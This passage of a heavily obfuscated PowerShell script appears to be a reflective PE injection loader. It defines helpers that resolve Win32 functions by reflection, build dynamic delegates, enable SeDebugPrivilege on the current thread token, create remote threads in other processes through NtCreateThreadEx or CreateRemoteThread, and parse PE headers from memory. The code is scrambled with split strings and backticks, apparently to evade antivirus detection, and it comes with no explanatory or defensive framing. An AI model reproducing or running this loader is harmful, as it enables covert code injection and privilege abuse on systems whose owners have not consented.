		${va`LU`e1},
		
		[Parameter(posITIon = 1, mANDAtoRy = ${t`Rue})]
		[Int64]
		${ValU`e2}
		)
		
		[Byte[]]${v`AluE1`BytES} =  (  iTeM ('VArI'+'a'+'bLE:wcOb7') ).vaLUE::("{0}{1}" -f 'GetBy','tes').Invoke(${v`ALue1})
		[Byte[]]${V`ALUE2`B`YTes} =  ${w`Co`B7}::("{1}{0}{2}"-f'tByt','Ge','es').Invoke(${V`ALU`E2})
		[Byte[]]${FI`NALB`y`Tes} =  (cHIlDItEm  ('variab'+'Le:wC'+'OB'+'7') ).valUE::"g`Et`BYTEs"([UInt64]0)

		if (${V`AL`UE1bYt`eS}."Cou`Nt" -eq ${Va`l`Ue2B`ytes}."Cou`Nt")
		{
			${Ca`R`RyOVeR} = 0
			for (${I} = 0; ${I} -lt ${VAL`UE`1Bytes}."CO`UNt"; ${I}++)
			{
				${V`Al} = ${Va`luE1b`YTEs}[${i}] - ${carr`Y`ovEr}
				
				if (${v`AL} -lt ${vALUE2`By`T`es}[${I}])
				{
					${v`Al} += 256
					${caRRY`ov`eR} = 1
				}
				else
				{
					${CARRy`OV`ER} = 0
				}
				
				
				[UInt16]${S`UM} = ${V`Al} - ${VAlUe2B`y`T`eS}[${I}]

				${fI`NA`lbyt`ES}[${I}] = ${S`UM} -band 0x00FF
			}
		}
		else
		{
			Throw ("{9}{10}{5}{11}{4}{1}{0}{8}{3}{6}{2}{7}" -f'tearra','t by','er','if','rac','not','f','ent sizes','ys of d','C','an',' subt')
		}
		
		return   ${w`Cob7}::("{0}{1}" -f'To','Int64').Invoke(${F`InA`lb`YTes}, 0)
	}
	

	Function adD-sIgNeDinTa`s`UN`s`IgNeD
	{
		Param(
		[Parameter(pOSItion = 0, manDaTory = ${tR`Ue})]
		[Int64]
		${vAL`U`e1},
		
		[Parameter(pOSItioN = 1, manDAtory = ${tr`Ue})]
		[Int64]
		${V`A`lUe2}
		)
		
		[Byte[]]${val`UE`1bYTES} =  ${w`c`OB7}::("{1}{2}{0}"-f'Bytes','Ge','t').Invoke(${Va`L`UE1})
		[Byte[]]${val`U`E2bYT`es} =  (  Ls  VarIaBlE:wCob7  ).VAlue::("{2}{0}{1}"-f'tB','ytes','Ge').Invoke(${Val`Ue2})
		[Byte[]]${fi`NA`LbYtes} =   (  ITem ('VarIa'+'ble:'+'Wcob7') ).valUE::"Ge`TB`YteS"([UInt64]0)

		if (${V`AlUE`1B`yteS}."C`OuNT" -eq ${v`ALU`e2b`yTEs}."co`Unt")
		{
			${C`A`RRyOveR} = 0
			for (${I} = 0; ${i} -lt ${vAL`Ue1`By`TES}."C`oUNT"; ${I}++)
			{
				
				[UInt16]${s`Um} = ${VALuE1BY`T`eS}[${I}] + ${v`A`lUe2B`yTeS}[${I}] + ${CaRRY`ov`ER}

				${FinAlB`YT`ES}[${I}] = ${S`Um} -band 0x00FF
				
				if ((${S`Um} -band 0xFF00) -eq 0x100)
				{
					${CA`Rr`YovER} = 1
				}
				else
				{
					${cA`RrY`oveR} = 0
				}
			}
		}
		else
		{
			Throw ("{1}{5}{6}{2}{0}{4}{3}"-f'ys of different ','Cann',' bytearra','zes','si','o','t add')
		}
		
		return  (Gci  ("varIaBLe"+":wC"+"oB7") ).VAlue::("{2}{1}{0}"-f '64','nt','ToI').Invoke(${f`INALb`yTes}, 0)
	}
	

	Function COMPAre`-`V`Al`1gREaTErTHa`NvaL2as`UiNt
	{
		Param(
		[Parameter(PoSITION = 0, MaNdAToRY = ${Tr`UE})]
		[Int64]
		${VAL`Ue1},
		
		[Parameter(pOsitiOn = 1, MAnDATory = ${Tr`UE})]
		[Int64]
		${va`lUe2}
		)
		
		[Byte[]]${V`A`LUe1`BYTEs} =  (DiR varIaBle:WcOB7).VALuE::("{1}{0}{2}"-f't','GetBy','es').Invoke(${V`ALUe1})
		[Byte[]]${vAl`U`E2BYt`Es} =   ${wcO`B7}::("{0}{2}{1}" -f'Ge','ytes','tB').Invoke(${val`Ue2})

		if (${va`LU`E1`BYteS}."C`ouNT" -eq ${va`lUe2`B`yTES}."C`OUNT")
		{
			for (${I} = ${Va`Lue1By`TEs}."CO`UnT"-1; ${I} -ge 0; ${i}--)
			{
				if (${vA`LUe1`B`YTEs}[${I}] -gt ${V`ALUe2b`YTEs}[${i}])
				{
					return ${t`Rue}
				}
				elseif (${Va`lU`E1by`TEs}[${I}] -lt ${vA`luE2B`Y`TEs}[${i}])
				{
					return ${f`A`lse}
				}
			}
		}
		else
		{
			Throw ("{2}{1}{0}{5}{6}{4}{3}{7}"-f'te arrays of dif',' by','Cannot compare','t ','en','fe','r','size')
		}
		
		return ${Fa`lse}
	}
	

	Function conVer`T`-`UiNTT`Oi`NT
	{
		Param(
		[Parameter(PositIoN = 0, mAndATory = ${Tr`UE})]
		[UInt64]
		${V`ALUE}
		)
		
		[Byte[]]${val`UEb`Y`TeS} =  ${w`c`oB7}::("{2}{1}{0}"-f 'tes','tBy','Ge').Invoke(${vA`lUE})
		return ( ( get-VArIaBlE wCob7  ).vALuE::("{2}{1}{0}" -f'64','Int','To').Invoke(${val`U`eByteS}, 0))
	}


    Function g`Et`-hEx
    {
        Param(
        [Parameter(PosiTiON = 0, mandAtOry = ${TR`UE})]
        ${vA`LuE} 
        )

        ${Va`LUeSi`Ze} =   ${lIsm`5t}::"si`zEoF"([Type]${VA`luE}.("{2}{1}{0}" -f'pe','Ty','Get').Invoke()) * 2
        ${H`EX} = "0x{0:X$($ValueSize)}" -f [Int64]${V`AlUE} 

        return ${h`Ex}
    }
	
	
	Function TESt`-`mEMoryrAn`g`evAL`ID
	{
		Param(
		[Parameter(poSItIon = 0, mAnDATORY = ${T`RUe})]
		[String]
		${deBUGs`T`R`INg},
		
		[Parameter(pOsiTiON = 1, maNDatoRy = ${T`RUe})]
		[System.Object]
		${P`eIn`FO},
		
		[Parameter(positIOn = 2, maNDATOrY = ${t`Rue})]
		[IntPtr]
		${S`T`ArtaDd`ResS},
		
		[Parameter(pAraMEtersEtnAMe = "EnDadD`Re`Ss", POsiTiOn = 3, MANdatoRy = ${T`RUe})]
		[IntPtr]
		${e`NDA`D`drESS},
		
		[Parameter(pArAmeTersEtname = "SI`zE", pOsITIon = 3, mANDaTORY = ${TR`Ue})]
		[IntPtr]
		${S`ize}
		)
		
		[IntPtr]${fI`NaleNda`ddrE`Ss} =  (GET-ITem ("V"+"AR"+"IablE:8"+"zH")).VaLue::"Z`eRO"
		if (${ps`Cm`dLET}.pARAmETerSEtnAme -eq ("{1}{0}"-f 'ize','S'))
		{
			[IntPtr]${f`In`ALEn`dAd`dress} = [IntPtr](&("{6}{1}{5}{2}{4}{0}{3}"-f 'gne','i','IntAsUns','d','i','gned','Add-S') (${STARtadD`R`ESs}) (${s`IZE}))
		}
		else
		{
			${fiNAl`ENdaDdR`Ess} = ${EndA`d`dRE`ss}
		}
		
		${p`eE`NDAddreSs} = ${pEi`N`Fo}."en`DadD`ReSS"
		
		if ((&("{0}{4}{9}{8}{3}{5}{7}{6}{1}{2}"-f'Co','al2As','UInt','ater','m','T','anV','h','Val1Gre','pare-') (${P`EiN`Fo}."PEH`AN`dLE") (${s`TAr`Tad`Dr`eSS})) -eq ${t`RuE})
		{
			Throw ('Tryi'+'ng '+'t'+'o '+'wr'+'ite '+'to'+' '+'m'+'emory'+' '+'smal'+'ler'+' '+'tha'+'n '+'al'+'locat'+'ed'+' '+'ad'+'dress '+'r'+'a'+'nge. '+"$DebugString")
		}
		if ((&("{6}{2}{5}{3}{0}{4}{1}" -f'n','Int','mp','re-Val1GreaterTha','Val2AsU','a','Co') (${fIN`Al`eNda`ddresS}) (${PEE`ND`A`DDrESS})) -eq ${T`RUE})
		{
			Throw ('Tr'+'y'+'ing '+'to'+' '+'writ'+'e '+'t'+'o '+'memory'+' '+'gr'+'eater '+'t'+'han '+'al'+'loc'+'at'+'ed '+'a'+'ddr'+'ess '+'r'+'a'+'nge. '+"$DebugString")
		}
	}
	
	
	Function wRITe-`BYtESToM`E`mo`Ry
	{
		Param(
			[Parameter(poSiTIon=0, mANdatoRY = ${t`RUe})]
			[Byte[]]
			${byT`eS},
			
			[Parameter(pOSItION=1, MaNdaTorY = ${t`Rue})]
			[IntPtr]
			${meM`ORy`AdDr`E`SS}
		)
	
		for (${O`FFS`eT} = 0; ${OFf`S`Et} -lt ${BYt`Es}."lENG`Th"; ${O`Ffs`ET}++)
		{
			 ( GeT-vaRiABLe  LIsM5T -VaLUE)::"WriTEB`yTE"(${M`emo`Ry`ADDReSs}, ${oF`FseT}, ${b`Y`Tes}[${Of`F`SEt}])
		}
	}
	

	
	Function GEt`-d`El`eGaTEt`ypE
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( pOsItIOn = 0)]
	        [Type[]]
	        ${P`Ar`AmET`eRS} = (&("{2}{1}{0}"-f 'ect','-Obj','New') ("{0}{1}"-f'T','ype[]')(0)),
	        
	        [Parameter( POsItioN = 1 )]
	        [Type]
	        ${re`T`URNTY`pE} = [Void]
	    )

	    ${dO`maIn} =   ${H`2a}::"Curr`ENtD`O`m`AiN"
	    ${DYn`AS`SEM`Bly} = &("{0}{1}{2}" -f'New','-Ob','ject') ("{4}{2}{1}{6}{5}{3}{8}{7}{0}"-f'me','stem.Refl','y','.Assembl','S','on','ecti','Na','y')(("{0}{3}{1}{2}"-f'Reflected','ele','gate','D'))
	    ${a`SsE`mBlYbuIld`ER} = ${D`O`MaiN}."DefIne`DYnaMiC`Ass`EM`Bly"(${Dy`N`As`seMBLy},  (gEt-vaRiaBlE  ('P1'+'5LH') -ValUEonL )::"R`UN")
	    ${MoD`U`LeBuiLder} = ${aSSEM`B`lY`BuIL`DeR}.("{0}{2}{4}{3}{1}" -f 'DefineDynam','le','icM','du','o').Invoke(("{3}{2}{1}{4}{0}" -f 'e','od','MemoryM','In','ul'), ${F`AlsE})
	    ${TYpEBU`iL`D`Er} = ${modULeB`U`i`LDer}.("{1}{0}{2}"-f 'fineT','De','ype').Invoke(("{2}{1}{0}{3}"-f 'Typ','legate','MyDe','e'), ("{4}{9}{3}{2}{8}{5}{0}{7}{6}{1}"-f 'iC','lass','ea','ublic, S','Clas',' Ans','utoC','lass, A','led,','s, P'), [System.MulticastDelegate])
	    ${CONS`TrUc`ToRBUIld`eR} = ${t`YPEbU`iLd`er}.("{3}{4}{0}{1}{2}"-f'ons','truct','or','Defi','neC').Invoke(("{5}{3}{2}{0}{1}{4}"-f 'Name',', HideBySig, ','ial','c','Public','RTSpe'),  (  Get-CHILdiTeM  ('vaR'+'iAB'+'lE:JbrPd') ).vAluE::"S`TaN`darD", ${PaRam`Ete`Rs})
	    ${c`oN`S`T`R`UCTorbuiLDeR}.("{4}{1}{3}{0}{2}" -f 'e','etI','mentationFlags','mpl','S').Invoke(("{3}{0}{2}{4}{1}"-f 'me, M','aged','a','Runti','n'))
	    ${me`T`hO`db`UIlDEr} = ${TYpeBu`iL`DER}.("{0}{1}{2}" -f 'DefineM','e','thod').Invoke('Invoke', ("{0}{4}{3}{1}{2}{5}"-f 'Publi',' New','Slot,','ig,','c, HideByS',' Virtual'), ${rE`Tu`RNtyPE}, ${paRA`m`ET`ERs})
	    ${m`eTH`oD`BUI`lDER}.("{1}{2}{0}{6}{3}{4}{5}" -f 'nF','SetImplement','atio','a','g','s','l').Invoke(("{4}{2}{0}{3}{1}"-f 'm','Managed','ti','e, ','Run'))
	    
	    &("{0}{3}{1}{2}" -f'Writ','Out','put','e-') ${T`y`PeBU`iLDEr}.("{1}{2}{3}{0}" -f'e','Cr','eat','eTyp').Invoke()
	}


	
	Function GE`T-`p`RoCAD`dRESs
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( PoSItIon = 0, MAndatoRy = ${t`RuE} )]
	        [String]
	        ${mOdu`lE},
	        
	        [Parameter( POsItIOn = 1, manDaToRy = ${t`Rue} )]
	        [String]
	        ${PRoc`ED`UrE}
	    )

	    
	    ${SYs`T`emaSsembly} =  ( gCI  ('Var'+'i'+'Able:h2A') ).value::"CUrREN`Tdoma`in".("{3}{0}{2}{1}" -f 'tAs','s','semblie','Ge').Invoke() |
	        &("{0}{2}{3}{1}" -f 'Whe','bject','r','e-O') { ${_}."GLOBa`lasS`E`MBLYC`AC`He" -And ${_}."l`oC`AtION".("{0}{1}"-f'Spli','t').Invoke('\\')[-1].("{0}{2}{1}" -f'E','s','qual').Invoke(("{2}{3}{1}{0}"-f'l','tem.dl','S','ys')) }
	    ${unsafEn`AtI`VEMETHo`Ds} = ${s`YstE`masSeMB`LY}.("{1}{0}" -f 'tType','Ge').Invoke(("{1}{3}{8}{6}{0}{4}{2}{7}{5}" -f'in32.Unsaf','Mic','ti','ros','eNa','Methods','.W','ve','oft'))
	    
	    ${g`e`TMOdulehA`NDLe} = ${UNs`AfEN`ATIvEmEtH`oDS}.("{1}{0}{2}"-f 'etMet','G','hod').Invoke(("{2}{1}{0}{3}{4}"-f'oduleH','etM','G','andl','e'))
	    ${GetP`Ro`CAdd`Re`sS} = ${unsaFE`Nativ`Em`E`THO`ds}.("{0}{2}{1}" -f'GetM','od','eth').Invoke(("{1}{0}{3}{2}{4}"-f'tPr','Ge','Add','oc','ress'))
	    
	    ${kERn32H`AND`LE} = ${GE`TMOduL`EHa`NDLe}."invo`ke"(${N`UlL}, @(${m`oDu`lE}))
	    ${Tm`p`PTR} = &("{0}{2}{1}" -f 'New-Ob','ct','je') ("{1}{0}{2}"-f 'ntP','I','tr')
	    ${H`A`NDlEREF} = &("{3}{2}{1}{0}"-f 'ect','Obj','ew-','N') ("{5}{1}{3}{4}{0}{7}{6}{2}" -f 'e.Intero','tem.Run','ndleRef','ti','m','Sys','s.Ha','pService')(${TMP`P`Tr}, ${KErN`3`2h`ANDlE})

	    
	    &("{0}{1}{2}" -f'Write-','Outpu','t') ${Ge`TPRoc`Ad`drEsS}."iNv`o`KE"(${N`UlL}, @([System.Runtime.InteropServices.HandleRef]${Ha`N`dLERef}, ${proC`e`Du`RE}))
	}
	
	
	Function enabl`E-SEdeB`UgP`Ri`V`il`ege
	{
		Param(
		[Parameter(posItION = 1, MAnDatorY = ${T`Rue})]
		[System.Object]
		${wIn32f`Unc`TIoNs},
		
		[Parameter(PoSItion = 2, mANDaTOrY = ${T`RUE})]
		[System.Object]
		${WIn`32`TYPES},
		
		[Parameter(POsitION = 3, MANDATORY = ${t`RuE})]
		[System.Object]
		${w`In`32con`stanTs}
		)
		
		[IntPtr]${tHrEADH`A`N`Dle} = ${wIn32FUN`cTI`Ons}."Ge`TcURrE`NTT`Hre`AD"."INV`OKe"()
		if (${ThRe`A`dHAnd`Le} -eq  ${8`ZH}::"Ze`Ro")
		{
			Throw ("{8}{7}{5}{9}{4}{10}{1}{2}{6}{0}{3}"-f'he current ','dl','e','thread','ha','e t',' to t','l','Unab','o get the ','n')
		}
		
		[IntPtr]${thR`e`AdtO`KEN} =   ( itEM  vARIAblE:8zH).ValuE::"Z`ErO"
		[Bool]${Re`sULT} = ${WiN32`FU`Nct`ioNS}."oPe`NtHREAdT`o`KEn"."in`VOkE"(${T`hR`E`AdhAn`dLe}, ${wIn32C`on`s`T`AnTs}."t`OKen_`Que`Ry" -bor ${w`IN32Con`sTa`NtS}."toK`eN_`A`dJu`st_PR`i`ViLEgES", ${f`A`LSE}, [Ref]${THrea`DToK`En})
		if (${r`EsuLt} -eq ${FaL`se})
		{
			${E`Rrorc`odE} =  ${LisM`5T}::("{2}{0}{1}{5}{4}{3}" -f 'L','astWin3','Get','rror','E','2').Invoke()
			if (${ER`R`O`RcoDe} -eq ${win`3`2CO`NStAn`Ts}."ErROr_N`o_`TO`kEn")
			{
				${r`E`sult} = ${w`IN`32F`UNc`TIOnS}."ImPErso`NaT`E`SeLF"."Inv`OKE"(3)
				if (${R`e`SuLT} -eq ${FAl`Se})
				{
					Throw ("{2}{4}{0}{6}{3}{1}{5}"-f 'mperso','el','Unable ',' s','to i','f','nate')
				}
				
				${REs`ULT} = ${Win`3`2fUNctIo`NS}."OPEN`THr`EADtO`K`eN"."Invo`ke"(${t`HRea`d`HA`NDLe}, ${w`IN32cONS`TAnts}."toKeN`_qUE`Ry" -bor ${win32`cONs`TA`Nts}."T`okeN_ad`ju`sT_`priVIle`GES", ${fAl`se}, [Ref]${THRE`AD`TO`KEN})
				if (${r`Es`ULt} -eq ${F`AlsE})
				{
					Throw ("{0}{5}{3}{1}{4}{2}" -f 'U',' Op','readToken.','ble to','enTh','na')
				}
			}
			else
			{
				Throw ('U'+'nabl'+'e '+'to'+' '+'Open'+'Threa'+'dTo'+'ken. '+'Err'+'or '+'code:'+' '+"$ErrorCode")
			}
		}
		
		[IntPtr]${P`lUid} =   ( geT-iTEm ('v'+'a'+'RIABl'+'e'+':Lism5t') ).VAlUe::"a`l`LocH`GlOBal"(  (  GEt-vARIAble ('LIS'+'m5t') -vALUEoNL  )::"SI`Z`eOF"([Type]${Wi`N`32`TYPeS}."lu`Id"))
		${r`e`suLt} = ${wI`N32fUn`c`Tio`NS}."l`OOKupPR`Iv`I`le`GeVaLUE"."iN`VoKe"(${N`ULl}, ("{1}{2}{0}"-f 'vilege','Se','DebugPri'), ${PLU`iD})
		if (${r`E`SULT} -eq ${Fa`LsE})
		{
			Throw ("{4}{2}{8}{7}{3}{1}{0}{9}{6}{5}"-f'le','vi','e to call','i','Unabl','ue','Val','okupPr',' Lo','ge')
		}

		[UInt32]${TOken`pRIV`s`i`ze} =  ( gI  VARiAbLe:Lism5t  ).vaLue::"Si`zE`OF"([Type]${wiN`3`2tYP`es}."T`oKe`N_PRiVILE`GES")
		[IntPtr]${To`KEnP`RIVIl`EGESM`EM} =  ( GET-ItEm ("vARiaBLE:"+"LIS"+"m"+"5T") ).VAlue::("{1}{3}{2}{0}" -f 'obal','All','l','ocHG').Invoke(${tok`E`N`prIvSizE})
		${token`P`R`IviLEgeS} =  (  geT-VaRIABlE LiSm5t  -vaLU  )::"pTrt`Os`TrU`cTuRE"(${tok`enP`Riv`ile`gE`Smem}, [Type]${w`iN`32tYPES}."To`Ken_`pr`IVIleges")
		${Tok`En`P`RiVilE`gES}."PrivILEg`E`COUnT" = 1
		${tOke`Np`RIVI`leGes}."p`R`IVI`LeGes"."lU`ID" =   ( VArIaBLe  LIsm5T  ).ValuE::"pt`R`T`o`STRucture"(${p`l`UiD}, [Type]${WIN32`TY`P`ES}."L`UID")
		${T`o`KenprI`ViL`EGES}."p`R`IViLEgES"."A`TTR`I`ButeS" = ${wiN32c`OnsT`An`Ts}."Se_`P`RIV`I`LE`gE_eNABLed"
		  ${li`s`m5t}::("{0}{1}{3}{2}{4}" -f 'S','tructureTo','t','P','r').Invoke(${tOKE`Np`RiVileG`eS}, ${ToKe`N`pRi`Vil`egeSmEm}, ${T`Rue})

		${Re`sUlT} = ${Wi`N`32fU`NC`TionS}."AdJ`UsTToK`eNPr`iviLe`geS"."INVo`Ke"(${tHre`AD`TokeN}, ${fA`Lse}, ${t`oKE`N`P`Ri`VILeges`mEm}, ${T`OKe`NPri`VsiZE},  ${8`zH}::"Ze`RO",   ${8`zh}::"z`eRo")
		${ERRor`CO`dE} =  ( geT-vARIable  ("lIsm5"+"t") -ValuEonL  )::("{1}{0}{2}{3}"-f'astW','GetL','in3','2Error').Invoke() 
		if ((${Re`s`ULT} -eq ${FA`l`sE}) -or (${errORC`O`De} -ne 0))
		{
			
		}
		
		 ${l`iSm5t}::("{2}{1}{0}{3}" -f'oba','HGl','Free','l').Invoke(${tOkeNP`Ri`VIleGE`smem})
	}
	
	
	Function Cre`AtE-`REmo`TeTHRead
	{
		Param(
		[Parameter(PosItiOn = 1, MandatORY = ${Tr`UE})]
		[IntPtr]
		${p`R`oCeSs`HA`NDLe},
		
		[Parameter(pOSiTIOn = 2, ManDaTory = ${t`RuE})]
		[IntPtr]
		${St`Art`AdDR`EsS},
		
		[Parameter(PosItiOn = 3, MANDaTOry = ${FAL`sE})]
		[IntPtr]
		${Ar`G`U`mEnTptr} =  (gi  varIABlE:8zh).value::"Z`eRo",
		
		[Parameter(POsitION = 4, MaNdAtORY = ${Tr`UE})]
		[System.Object]
		${wIn32Fu`NCTI`o`Ns}
		)
		
		[IntPtr]${rEmOt`eTh`R`E`Ad`HanDle} =  (get-vARiabLE ("8"+"zH") -vA )::"Z`ERO"
		
		${OS`VER`sI`ON} =   ${5`Wq`lTP}::"oS`VersIoN"."V`e`RsiON"
		
		if ((${Os`VEr`sioN} -ge (&("{1}{2}{0}"-f'-Object','Ne','w') ("{0}{1}{2}"-f'Ve','rsio','n') 6,0)) -and (${O`s`VErsi`oN} -lt (&("{0}{1}{2}" -f 'Ne','w-Objec','t') ("{1}{0}"-f'ion','Vers') 6,2)))
		{
			
			${retv`AL}= ${wIn32Fun`C`TiO`NS}."NtCRe`AtETHre`AD`ex"."i`NVO`Ke"([Ref]${ReMOT`e`TH`ReAD`HaND`le}, 0x1FFFFF,   (varIABlE 8zH  ).Value::"z`eRO", ${PRocE`ss`haNd`le}, ${stART`A`d`DRE`ss}, ${ARgU`men`TptR}, ${F`ALsE}, 0, 0xffff, 0xffff,   (  chiLDIteM vaRiAbLe:8Zh  ).VAlue::"ze`RO")
			${LaSte`R`ROR} =  (  ls vArIaBLE:LisM5T ).vaLUE::("{2}{3}{0}{4}{1}" -f 't','Error','G','e','LastWin32').Invoke()
			if (${remO`T`ETH`ReaDhandLe} -eq   ( gEt-ChilDitEm ("vARiAble:"+"8"+"zH") ).vAlUe::"Z`ERo")
			{
				Throw ('Error'+' '+'in'+' '+'Nt'+'CreateThr'+'e'+'adEx.'+' '+'Re'+'tur'+'n '+'val'+'ue: '+"$RetVal. "+'LastEr'+'ror'+': '+"$LastError")
			}
		}
		
		else
		{
			
			${remO`TethrEAd`H`A`Nd`lE} = ${wIn`32F`UnC`TIOnS}."Cr`EATEREm`oT`e`Th`READ"."INv`O`ke"(${Pr`OCeS`SHa`Nd`Le},   (  dir  VAriaBlE:8zh).ValUe::"z`eRo", [UIntPtr][UInt64]0xFFFF, ${S`TAR`TADD`Re`ss}, ${AR`gUm`En`TPTR}, 0,  (geT-VArIable 8zH  -VA)::"ZE`Ro")
		}
		
		if (${rEM`oTe`TH`READHAnDLE} -eq   ( gET-vaRiabLe  ('8'+'zH')  ).vALUE::"ze`Ro")
		{
			&("{2}{0}{1}"-f 'e-Err','or','Writ') ("{8}{3}{4}{6}{1}{5}{2}{7}{0}"-f 'ndle is null','ote','read h','rror creatin','g r',' thread, th','em','a','E') -ErrorAction ("{0}{1}"-f 'St','op')
		}
		
		return ${r`EMOT`eTHREA`DHandLe}
	}

	

	Function gEt-IM`AgENThE`Ad`e`RS
	{
		Param(
		[Parameter(PoSItIoN = 0, mandATORY = ${t`RUE})]
		[IntPtr]
		${peh`AndLE},
		
		[Parameter(PoSiTIoN = 1, MAnDAToRY = ${T`RUe})]
		[System.Object]
		${wi`N`3`2tYpes}
		)
		
		${NThEad`ErsIN`Fo} = &("{0}{2}{1}" -f 'New-Ob','ct','je') ("{2}{0}{1}"-f'ystem.','Object','S')
		
		
		${dO`sHeAD`er} =  ( VARIabLe  LiSM5T  ).Value::"PTrT`oStr`Ucture"(${PEH`And`Le}, [Type]${WIn`32`Ty`Pes}."i`M`AGE_d`os_He`ADER")

		
		[IntPtr]${NTh`Ea`d`erspTr} = [IntPtr](&("{1}{4}{3}{5}{0}{2}"-f'AsUnsign','A','ed','Signe','dd-','dInt') ([Int64]${p`e`HaNdlE}) ([Int64][UInt64]${DO`sh`EA`deR}."E`_Lf`ANeW"))
		${N`T`HEAdEr`sINfO} | &("{1}{0}{2}" -f'd-Me','Ad','mber') -MemberType ("{1}{2}{0}{3}" -f 'oper','N','otePr','ty') -Name ("{0}{2}{1}{3}" -f 'NtHe','Pt','aders','r') -Value ${NTHEa`De`Rsptr}
		${ImA`G`ENTHE`ADeRS64} =  ${lIsM`5T}::"PtR`T`OS`TR`UCtuRE"(${Nt`hEAd`E`RS`pTr}, [Type]${wi`N32`TYpeS}."iMa`Ge_`NT_HEA`DERS64")
		
		
	    if (${Im`AGENT`HE`AdE`RS64}."sIGnaT`U`Re" -ne 0x00004550)
	    {
	        throw ("{6}{0}{3}{2}{5}{4}{1}{7}"-f'id I','i','E','MAG','NT_HEADER s','_','Inval','gnature.')
	    }
		
		if (${imaGe`N`T`heaD`eR`s64}."op`T`IONALheAder"."M`AgIC" -eq ("{0}{3}{4}{5}{6}{7}{1}{2}" -f'I','_MAGI','C','MAGE_NT','_OP','TI','O','NAL_HDR64'))
		{
			${n`T`Hea`de`RSINfo} | &("{0}{1}{3}{2}" -f'Ad','d-M','ber','em') -MemberType ("{2}{0}{1}" -f 'otePro','perty','N') -Name ("{2}{0}{3}{1}" -f'E_N','DERS','IMAG','T_HEA') -Value ${Im`AGEnTH`eAdERS`64}
			${NThEAd`e`Rsin`FO} | &("{0}{2}{1}" -f'Add','Member','-') -MemberType ("{3}{1}{2}{0}"-f'operty','ote','Pr','N') -Name ("{2}{1}{0}"-f'64Bit','E','P') -Value ${tr`UE}
		}
		else
		{
			${i`Ma`GEn`T`heADers32} =   ${l`i`SM5T}::"P`TRTOsTRUc`TurE"(${ntHE`AD`erSptr}, [Type]${wi`N32`TypeS}."i`MagE_NT_`Heade`R`s32")
			${NthEaDE`RS`IN`FO} | &("{2}{3}{1}{0}" -f'Member','d-','A','d') -MemberType ("{0}{2}{3}{1}"-f'Note','ty','Pr','oper') -Name ("{1}{2}{0}{3}" -f 'DE','IMAG','E_NT_HEA','RS') -Value ${IMAGeNT`hEa`D`eRS32}
			${N`ThEAd`e`RSinFO} | &("{2}{0}{3}{1}" -f '-M','er','Add','emb') -MemberType ("{0}{3}{2}{1}"-f'Note','ty','r','Prope') -Name ("{0}{1}"-f 'PE','64Bit') -Value ${F`A`LSE}
		}
		
		return ${nTH`EAD`ERSi`NFO}
	}


	
	Function geT`-pe`B`ASic`iNfo
	{
		Param(
		[Parameter( POSitiOn = 0, maNDAtoRy = ${Tr`UE} )]
		[Byte[]]
		${pe`Byt`eS},
		
		[Parameter(POSITiOn = 1, ManDatOry = ${t`RUE})]
		[System.Object]
		${WIN3`2Ty`pEs}
		)
		
		${Pe`INFO} = &("{2}{0}{1}"-f'ew-O','bject','N') ("{3}{0}{2}{1}"-f 'ste','Object','m.','Sy')
		
		
		[IntPtr]${U`NM`ANAge`dpe`ByTES} =   ( cHilDiTEm  variabLE:liSm5T  ).VALUe::("{2}{1}{0}{3}" -f 'Gl','locH','Al','obal').Invoke(${P`E`ByteS}."LENG`Th")
		  ${LI`sm`5T}::("{1}{0}" -f 'opy','C').Invoke(${PeByT`eS}, 0, ${unma`N`AGedpEb`Ytes}, ${PE`BYt`eS}."Le`N`GTh") | &("{1}{0}{2}"-f'-','Out','Null')
		
		
		${N`ThEADERSI`NFO} = &("{3}{4}{1}{2}{0}"-f 'rs','Head','e','G','et-ImageNt') -PEHandle ${UNMAN`AG`EDp`EbYTeS} -Win32Types ${wIN32T`y`pes}
		
		
		${pEi`NFO} | &("{0}{1}{2}"-f'Ad','d-Me','mber') -MemberType ("{0}{1}{2}"-f 'NoteP','ro','perty') -Name ("{1}{0}{2}"-f'4','PE6','Bit') -Value (${NT`headeRS`INfO}."p`e`64BIT")
		${p`e`iNFO} | &("{0}{2}{1}"-f 'A','ber','dd-Mem') -MemberType ("{2}{3}{1}{0}"-f'ty','er','NotePro','p') -Name ("{3}{4}{0}{2}{1}"-f 'gi','mageBase','nalI','Or','i') -Value (${nTHeA`DerS`Info}."ImAGE`_NT_`hE`ADE`RS"."O`PTIonA`LheA`DER"."IMa`geBASe")
		${p`E`iNFo} | &("{2}{0}{1}" -f'Membe','r','Add-') -MemberType ("{2}{0}{3}{1}" -f 'ePr','y','Not','opert') -Name ("{0}{1}{3}{2}" -f'Siz','eOf','e','Imag') -Value (${nthEA`De`RS`InFO}."iMag`E_Nt`_`hEaDe`RS"."Op`TIOn`AL`HE`AdER"."SizeOFI`m`AGE")
		${p`E`InFo} | &("{1}{2}{0}" -f 'mber','Add-','Me') -MemberType ("{2}{1}{3}{0}" -f'y','rop','NoteP','ert') -Name ("{0}{1}{2}{3}"-f'S','izeO','fHe','aders') -Value (${N`Th`eADeRSINfO}."IM`AGe_nt_`he`ADe`Rs"."oPTIO`NA`Lhea`D`ER"."s`IzeOfh`Ea`DErS")
		${pE`InFO} | &("{3}{0}{1}{2}"-f'-M','e','mber','Add') -MemberType ("{1}{2}{0}" -f'erty','N','oteProp') -Name ("{2}{4}{3}{0}{1}" -f 'teris','tics','D','ac','llChar') -Value (${N`THeAdE`R`sInFo}."imA`gE_`Nt_H`eaDe`RS"."o`pT`IO`N`ALHeadER"."DlLc`ha`Ra`CTE`RiStICs")
		
		
		  ( LS  VARIaBlE:lISm5t).vaLUe::("{2}{0}{1}" -f'reeHG','lobal','F').Invoke(${unM`ANA`G`Edp`eBytES})
		
		return ${PEiN`FO}
	}


	
	
	Function GE`T-PEDEt`Ail`Ed`i`NFO
	{
		Param(
		[Parameter( pOSITion = 0, mANDATORY = ${Tr`Ue})]
		[IntPtr]
		${pe`HA`NdlE},
		
		[Parameter(PoSItIoN = 1, MANDatoRy = ${t`RUe})]
		[System.Object]
		${wi`N3`2`TYPEs},
		
		[Parameter(POsITION = 2, MaNdAtoRY = ${tr`Ue})]
		[System.Object]
		${wi`N32coN`S`Ta`NTs}
		)
		
		if (${PE`HaN`DlE} -eq ${nu`Ll} -or ${PEHaN`d`Le} -eq  (  VarIablE ("8Z"+"h") ).valUE::"Z`erO")
		{
			throw ("{4}{0}{1}{2}{6}{5}{3}"-f ' n','ull',' o','Zero','PEHandle is','Ptr.','r Int')
		}
		
